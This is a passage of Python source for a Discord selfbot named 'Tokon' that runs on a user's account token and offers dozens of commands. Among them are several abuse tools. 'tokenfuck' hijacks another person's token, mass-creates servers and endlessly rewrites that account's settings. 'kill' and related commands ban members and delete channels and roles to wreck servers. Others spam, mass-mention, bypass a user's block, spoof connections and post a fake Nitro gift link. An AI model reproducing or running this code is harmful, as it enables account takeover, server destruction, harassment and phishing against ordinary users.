            r = requests.get('https://www.conversationstarters.com/generator.php').content
            soup = bs4(r, 'html.parser')
            topic = soup.find(id="random").text
            await ctx.send(topic)

        @Tokon.command()
        async def hypesquad(ctx, house):
            await ctx.message.delete()
            request = requests.Session()
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            }
            if house == "bravery":
                payload = {'house_id': 1}
            elif house == "brilliance":
                payload = {'house_id': 2}
            elif house == "balance":
                payload = {'house_id': 3}
            elif house == "random":
                houses = [1, 2, 3]
                payload = {'house_id': random.choice(houses)}
            try:
                request.post('https://discordapp.com/api/v9/hypesquad/online', headers=headers, json=payload,
                             timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)

        @Tokon.command()
        async def fakenet(ctx, _type=None, *, name=None):
            await ctx.message.delete()
            if _type is None or name is None:
                await ctx.send("missing parameters")
                return
            ID = random.randrange(10000000, 90000000)
            avaliable = [
                'battlenet',
                'skype',
                'lol']
            payload = {
                'name': name,
                'visibility': 1
            }
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
            }

            if name is None:
                name = 'about:blank'
            elif _type not in avaliable:
                await ctx.send(f'Avaliable connections: `{avaliable}`', delete_after=3)
                return
            r = requests.put(f'https://discordapp.com/api/v9/users/@me/connections/{_type}/{ID}',
                             data=json.dumps(payload), headers=headers)
            if r.status_code == 200:
                await ctx.send(f"Invalid connection_type: `{type}` with Username: `{name}` and ID: `{ID}`",
                               delete_after=3)
            else:
                await ctx.send(
                    '**[ERROR]** `Tokon Fake-Connection doesn\'t work anymore because Discord patched connection-spoofing`')

        @Tokon.command()
        async def tokenfuck(ctx, _token):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
                    'Content-Type': 'application/json',
                    'Authorization': _token,
                }
                request = requests.Session()
                payload = {
                    'theme': "light",
                    'locale': "ja",
                    'message_display_compact': False,
                    'inline_embed_media': False,
                    'inline_attachment_media': False,
                    'gif_auto_play': False,
                    'render_embeds': False,
                    'render_reactions': False,
                    'animate_emoji': False,
                    'convert_emoticons': False,
                    'enable_tts_command': False,
                    'explicit_content_filter': '0',
                    'status': "invisible"
                }
                guild = {
                    'channels': None,
                    'icon': None,
                    'name': "Tokon",
                    'region': "europe"
                }
                for _i in range(50):
                    requests.post('https://discordapp.com/api/v9/guilds', headers=headers, json=guild)
                while True:
                    try:
                        request.patch("https://discordapp.com/api/v9/users/@me/settings", headers=headers,
                                      json=payload)
                    except Exception as e:
                        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
                    else:
                        break
                modes = cycle(["light", "dark"])
                statuses = cycle(["online", "idle", "dnd", "invisible"])
                while True:
                    setting = {
                        'theme': next(modes),
                        'locale': random.choice(locales),
                        'status': next(statuses)
                    }
                    while True:
                        try:
                            request.patch("https://discordapp.com/api/v9/users/@me/settings", headers=headers,
                                          json=setting,
                                          timeout=10)
                        except Exception as e:
                            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
                        else:
                            break
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def blockmsg(ctx, userId, *, msg):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                token = decode('')

                class BlockBypass:
                    def __init__(self, token, userId):
                        self.channelId = None
                        self.userId = userId
                        self.api = 'https://discord.com/api/v9/'
                        self.headers = {
                            'Authorization': token,
                            'Content-Type': 'application/json',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'
                        }

                    def generateChannel(self):
                        request = requests.post(f'{self.api}users/@me/channels', json={'recipients': [self.userId]}, headers=self.headers)

                        if request.status_code == 200:
                            self.channelId = request.json()['id']
                            self.main()

                    def sendMessage(self, message):
                        request = requests.post(f'{self.api}channels/{self.channelId}/messages', json={'content': message}, headers=self.headers)

                    def main(self):
                        content = msg

                        self.sendMessage(content)

                if __name__ == '__main__':
                    yesnt = BlockBypass(token, userId)
                    yesnt.generateChannel()
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def rep(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                await ctx.send(f'{Tokon.lastcommand}')
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def antimassdm(ctx):
            await ctx.message.delete()


        @Tokon.command()
        async def copyserver(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                await Tokon.create_guild(f'backup-{ctx.guild.name}')
                await asyncio.sleep(4)
                for g in Tokon.guilds:
                    if f'backup-{ctx.guild.name}' in g.name:
                        for c in g.channels:
                            await c.delete()
                        for cate in ctx.guild.categories:
                            x = await g.create_category(f"{cate.name}")
                            for chann in cate.channels:
                                if isinstance(chann, discord.VoiceChannel):
                                    await x.create_voice_channel(f"{chann}")
                                if isinstance(chann, discord.TextChannel):
                                    await x.create_text_channel(f"{chann}")
                        for role in ctx.guild.roles:
                            name = role.name
                            color = role.colour
                            perms = role.permissions
                            await g.create_role(name=name, permissions=perms, colour=color)
                try:
                    await g.edit(icon=ctx.guild.icon_url)
                except:
                    pass
            else:
                await ctx.send('***Premium Invalid***')
                            
        @Tokon.command()
        async def poll(ctx, *, arguments):
            await ctx.message.delete()
            message = discord.utils.escape_markdown(
                arguments[str.find(arguments, "msg:"):str.find(arguments, "1:")]).replace(
                "msg:", "")
            option1 = discord.utils.escape_markdown(
                arguments[str.find(arguments, "1:"):str.find(arguments, "2:")]).replace(
                "1:", "")
            option2 = discord.utils.escape_markdown(arguments[str.find(arguments, "2:"):]).replace("2:", "")
            message = await ctx.send(f'`Poll: {message}\nOption 1: {option1}\nOption 2: {option2}`')
            await message.add_reaction('🅰')
            await message.add_reaction('🅱')

        @Tokon.command()
        async def massmention(ctx, *, message=None):
            await ctx.message.delete()
            if len(list(ctx.guild.members)) >= 50:
                userList = list(ctx.guild.members)
                random.shuffle(userList)
                sampling = random.choices(userList, k=50)
                if message is None:
                    post_message = ""
                    for user in sampling:
                        post_message += user.mention
                    await ctx.send(post_message)
                else:
                    post_message = message + "\n\n"
                    for user in sampling:
                        post_message += user.mention
                    await ctx.send(post_message)
            else:
                if message is None:
                    post_message = ""
                    for user in list(ctx.guild.members):
                        post_message += user.mention
                    await ctx.send(post_message)
                else:
                    post_message = message + "\n\n"
                    for user in list(ctx.guild.members):
                        post_message += user.mention
                    await ctx.send(post_message)

        @Tokon.command()
        async def kill(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                for user in list(ctx.guild.members):
                    try:
                        await user.ban()
                    except:
                        pass
                for channel in list(ctx.guild.channels):
                    try:
                        await channel.delete()
                    except:
                        pass
                for role in list(ctx.guild.roles):
                    try:
                        await role.delete()
                    except:
                        pass
                try:
                    await ctx.guild.edit(
                        name=RandString(),
                        description="Tokon LOL",
                        reason="Tokon LOL",
                        icon=None,
                        banner=None
                    )
                except:
                    pass
                for _i in range(10):
                    await ctx.guild.create_text_channel(name="Tokon")
                for _i in range(10):
                    await ctx.guild.create_role(name="Tokon", color=RandomColor())
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def dynoban(ctx):
            await ctx.message.delete()
            for member in list(ctx.guild.members):
                message = await ctx.send("?ban " + member.mention)
                await message.delete()
                await asyncio.sleep(1.5)

        @Tokon.command()
        async def massrole(ctx):
            await ctx.message.delete()
            for _i in range(250):
                try:
                    await ctx.guild.create_role(name="Tokon", color=RandomColor())
                except:
                    return

        @Tokon.command()
        async def spamchannels(ctx):
            await ctx.message.delete()
            for _i in range(250):
                try:
                    await ctx.guild.create_text_channel(name="Tokon")
                except:
                    return

        @Tokon.command()
        async def delchannels(ctx):
            await ctx.message.delete()
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                except:
                    return

        @Tokon.command()
        async def delroles(ctx):
            await ctx.message.delete()
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                except:
                    pass

        @Tokon.command()
        async def massunban(ctx):
            await ctx.message.delete()
            banlist = await ctx.guild.bans()
            for users in banlist:
                try:
                    await asyncio.sleep(2)
                    await ctx.guild.unban(user=users.user)
                except:
                    pass

        @Tokon.command()
        async def spam(ctx, amount: int, *, message):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                for i in range(amount):
                    await ctx.send(message)
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def dm(ctx, user: discord.User, *, message):
            await ctx.message.delete()
            channel = await user.create_dm()
            await channel.send(message)

        @Tokon.command()
        async def getcolor(ctx, *, color: discord.Colour):
            await ctx.message.delete()
            file = io.BytesIO()
            Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
            file.seek(0)
            em = discord.Embed(color=color, title=f'{str(color)}')
            em.set_image(url='attachment://color.png')
            await ctx.send(file=discord.File(file, 'color.png'), embed=em)

        @Tokon.command()
        async def ping(ctx):
            await ctx.message.delete()
            before = time.monotonic()
            message = await ctx.send("Pinging...")
            ping = (time.monotonic() - before) * 1000
            await message.edit(content=f"`{int(ping)} ms`")

        @Tokon.command()
        async def serverinfo(ctx):
            await ctx.message.delete()
            date_format = "%a, %d %b %Y %I:%M %p"
            embed = discord.Embed(title=f"{ctx.guild.name}",
                                  description=f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
                                  timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
            embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
            embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
            embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
            embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
            embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
            await ctx.send(embed=embed)

        @Tokon.command()
        async def wizz(ctx):
            await ctx.message.delete()
            if isinstance(ctx.message.channel, discord.TextChannel):
                print("hi")
                initial = random.randrange(0, 60)
                message = await ctx.send(f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting itss...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`")
            elif isinstance(ctx.message.channel, discord.DMChannel):
                initial = random.randrange(1, 60)
                message = await ctx.send(
                    f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
            elif isinstance(ctx.message.channel, discord.GroupChannel):
                initial = random.randrange(1, 60)
                message = await ctx.send(
                    f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`")

        @Tokon.command(name='8ball')
        async def _ball(ctx, *, question):
            await ctx.message.delete()
            responses = [
                'That is a resounding no',
                'It is not looking likely',
                'Too hard to tell',
                'It is quite possible',
                'That is a definite yes!',
                'Maybe',
                'There is a good chance'
            ]
            answer = random.choice(responses)
            embed = discord.Embed()
            embed.add_field(name="Question", value=question, inline=False)
            embed.add_field(name="Answer", value=answer, inline=False)
            embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
            await ctx.send(embed=embed)

        @Tokon.command()
        async def slot(ctx):
            await ctx.message.delete()
            emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
            a = random.choice(emojis)
            b = random.choice(emojis)
            c = random.choice(emojis)
            slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
            if a == b == c:
                await ctx.send(embed=discord.Embed.from_dict(
                    {"title": "Slot machine", "description": f"{slotmachine} All matchings, you won!"}))
            elif (a == b) or (a == c) or (b == c):
                await ctx.send(embed=discord.Embed.from_dict(
                    {"title": "Slot machine", "description": f"{slotmachine} 2 in a row, you won!"}))
            else:
                await ctx.send(embed=discord.Embed.from_dict(
                    {"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))

        @Tokon.command()
        async def tts(ctx, *, message):
            await ctx.message.delete()
            buff = await do_tts(message)
            await ctx.send(file=discord.File(buff, f"{message}.wav"))

        @Tokon.command()
        async def serverpfp(ctx):
            await ctx.message.delete()
            em = discord.Embed(title=ctx.guild.name)
            em.set_image(url=ctx.guild.icon_url)
            await ctx.send(embed=em)

        @Tokon.command()
        async def serverbanner(ctx):
            await ctx.message.delete()
            em = discord.Embed(title=ctx.guild.name)
            em.set_image(url=ctx.guild.banner_url)
            await ctx.send(embed=em)

        @Tokon.command()
        async def firstmessage(ctx, channel: discord.TextChannel = None):
            await ctx.message.delete()
            if channel is None:
                channel = ctx.channel
            first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
            embed = discord.Embed(description=first_message.content)
            embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
            await ctx.send(embed=embed)

        @Tokon.command()
        async def renamechannels(ctx, *, name):
            await ctx.message.delete()
            for channel in ctx.guild.channels:
                await channel.edit(name=name)

        @Tokon.command()
        async def servername(ctx, *, name):
            await ctx.message.delete()
            await ctx.guild.edit(name=name)

        @Tokon.command()
        async def nickall(ctx, nickname):
            await ctx.message.delete()
            for user in list(ctx.guild.members):
                try:
                    await user.edit(nick=nickname)
                except:
                    pass

        @Tokon.command()
        async def youtube(ctx, *, search):
            await ctx.message.delete()
            query_string = parse.urlencode({'search_query': search})
            html_content = request.urlopen('http://www.youtube.com/results?' + query_string)
            search_results = re.findall('href=\"\\/watch\\?v=(.{11})', html_content.read().decode())
            await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])

        @Tokon.command()
        async def prefix(ctx, prefix):
            embed = discord.Embed(color=Tokon.Color)
            embed.set_author(name=f"Prefix", icon_url="")
            embed.set_thumbnail(url=Tokon.thumbnail)
            embed.set_footer(text=f"{Tokon.footer}")
            description = f"```Prefix Changed [{Tokon.command_prefix}] to [{prefix}]```"
            embed.description = f"{description}"
            await ctx.message.edit(content='ﾠﾠ')
            await ctx.message.edit(embed=embed)
            Tokon.command_prefix = str(prefix)

        @Tokon.command()
        async def theme(ctx, bababoi):
            await ctx.message.delete()
            if bababoi == "rewow":
                Tokon.theme = "diff"
                Tokon.prevent = "diff"
            elif bababoi == "blor":
                Tokon.theme = "css"
                Tokon.prevent = "ini"
            elif bababoi == "inblor":
                Tokon.theme = "ini"
                Tokon.prevent = "css"
            elif bababoi == "yewow":
                Tokon.theme = "fix"
                Tokon.prevent = "fix"
            else:
                TokonError("This Theme Doesn't Exist !")

        @Tokon.command()
        async def themes(ctx):
            content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  » is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[theme yewow]   
[theme rewow]    
     
[theme blor]      
[theme inblor]        


[{Tokon.footer}]
```""")
            await ctx.message.delete()
            await ctx.send(content=content)
        @Tokon.command()
        async def footer(ctx, link):
            if link == None:
                Tokon.thumbnail = ""
            else:
                Tokon.thumbnail = link
            content = on_theme(f"```Thumbnail Changed ! ```")
            await ctx.message.delete()
            await ctx.send(content=content)


        @Tokon.command()
        async def abc(ctx):
            await ctx.message.delete()
            ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's',
                   't',
                   'u',
                   'v', 'w', 'x', 'y', 'z']
            message = await ctx.send(ABC[0])
            await asyncio.sleep(2)
            for _next in ABC[1:]:
                await message.edit(content=_next)
                await asyncio.sleep(2)

        @Tokon.command()
        async def count100(ctx):
            await ctx.message.delete()
            message = ctx.send("Starting count to 100")
            await asyncio.sleep(2)
            for _ in range(100):
                await message.edit(content=_)
                await asyncio.sleep(2)

        @Tokon.command()
        async def bitcoin(ctx):
            await ctx.message.delete()
            r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
            r = r.json()
            usd = r['USD']
            eur = r['EUR']
            em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
            em.set_author(name='Bitcoin',
                          icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
            await ctx.send(embed=em)

        @Tokon.command()
        async def etherium(ctx):
            await ctx.message.delete()
            r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
            r = r.json()
            usd = r['USD']
            eur = r['EUR']
            em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
            em.set_author(name='Ethereum',
                          icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
            await ctx.send(embed=em)

        @Tokon.command()
        async def hastebin(ctx, *, message):
            await ctx.message.delete()
            r = requests.post("https://hastebin.com/documents", data=message).json()
            await ctx.send(f"<https://hastebin.com/{r['key']}>")

        @Tokon.command()
        async def ascii(ctx, *, text):
            await ctx.message.delete()
            r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
            if len('```' + r + '```') > 2000:
                return
            await ctx.send(f"```{r}```")
            
        @Tokon.command()
        async def acceptfriends(ctx):
            await ctx.message.delete()
            for relationship in Tokon.user.relationships:
                if relationship == discord.RelationshipType.incoming_request:
                    await relationship.accept()

        @Tokon.command()
        async def ignorefriends(ctx):
            await ctx.message.delete()
            for relationship in Tokon.user.relationships:
                if relationship is discord.RelationshipType.incoming_request:
                    relationship.delete()

        @Tokon.command()
        async def delfriends(ctx):
            await ctx.message.delete()
            for relationship in Tokon.user.relationships:
                if relationship is discord.RelationshipType.friend:
                    await relationship.delete()

        @Tokon.command()
        async def clearblocked(ctx):
            await ctx.message.delete()
            print(Tokon.user.relationships)
            for relationship in Tokon.user.relationships:
                if relationship is discord.RelationshipType.blocked:
                    print(relationship)
                    await relationship.delete()

        @Tokon.command()
        async def regionchange(ctx, amount):
            await ctx.message.delete()
            if isinstance(ctx.message.channel, discord.GroupChannel):
                print()

        @Tokon.command()
        async def kickgc(ctx):
            await ctx.message.delete()
            if isinstance(ctx.message.channel, discord.GroupChannel):
                for recipient in ctx.message.channel.recipients:
                    await ctx.message.channel.remove_recipients(recipient)

        @Tokon.command()
        async def leavegc(ctx):
            await ctx.message.delete()
            if isinstance(ctx.message.channel, discord.GroupChannel):
                await ctx.message.channel.leave()

        @Tokon.command()
        async def massreact(ctx, emote):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                messages = await ctx.message.channel.history(limit=40).flatten()
                for message in messages:
                    await message.add_reaction(emote)
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def linkvertise(ctx, link):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                headers = {
                    "Host": "bypass.bot.nu",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Referer": "https://bypass.bot.nu/",
                    "Connection": "keep-alive",
                }

                try:
                    data = requests.get(f"https://bypass.bot.nu/bypass2?url={link}", headers=headers)
                    link = data.json()["destination"]
                    print(Style.BRIGHT + f"[¤]{Fore.BLACK} Real Link :{Fore.GREEN} {link}{Fore.RESET}")
                except:
                    print(Style.BRIGHT + f"[{Fore.RED}#{Fore.RESET}]{Fore.BLACK} An unexpected error occurred")
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def readservers(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                for guild in Tokon.guilds:
                    await guild.ack()
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def nitroserver(ctx, serverlink):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                embed = discord.Embed(title="Nitro", description=f"[https://discord.gg/gift/gj2jKZcteT4uMZGm]({serverlink})")
                embed.set_image(url="https://cdn.discordapp.com/attachments/901245808517718077/926207025300525167/Discord-Nitro-e1618858537976.png")
                await ctx.send(embed=embed)
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def clearmenu(ctx):
            await ctx.message.delete()
            cs()
            startprint()

        @Tokon.command()
        async def rainbow(ctx, *, role):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                role = discord.utils.get(ctx.guild.roles, name=role)
                while True:
                    try:
                        await role.edit(role=role, colour=RandomColor())
                        await asyncio.sleep(0.8)
                    except:
                        break
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def dog(ctx):
            await ctx.message.delete()
            r = requests.get("https://dog.ceo/api/breeds/image/random").json()
            link = str(r['message'])
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(link) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Tokon_dog.png"))
            except:
                await ctx.send(link)

        @Tokon.command()
        async def cat(ctx):
            await ctx.message.delete()
            r = requests.get("https://api.thecatapi.com/v1/images/search").json()
            link = str(r[0]["url"])
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(link) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Tokon_cat.png"))
            except:
                await ctx.send(link)

        @Tokon.command()
        async def sadcat(ctx):
            await ctx.message.delete()
            r = requests.get("https://api.alexflipnote.dev/sadcat").json()
            link = str(r['file'])
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(link) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Tokon_sadcat.png"))
            except:
                await ctx.send(link)

        @Tokon.command()
        async def bird(ctx):
            await ctx.message.delete()
            r = requests.get("https://api.alexflipnote.dev/birb").json()
            link = str(r['file'])
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(link) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Tokon_bird.png"))
            except:
                await ctx.send(link)

        @Tokon.command()
        async def fox(ctx):
            await ctx.message.delete()
            r = requests.get('https://randomfox.ca/floof/').json()
            link = str(r["image"])
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(link) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Tokon_fox.png"))
            except:
                await ctx.send(link)

        @Tokon.command()
        async def feed(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/feed")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_feed.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def tickle(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/tickle")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_tickle.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def slap(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/slap")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_slap.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def hug(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/hug")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_hug.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def cuddle(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/cuddle")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_cuddle.gif"))
            except:
                em = discord.Embed(description=user.mention)
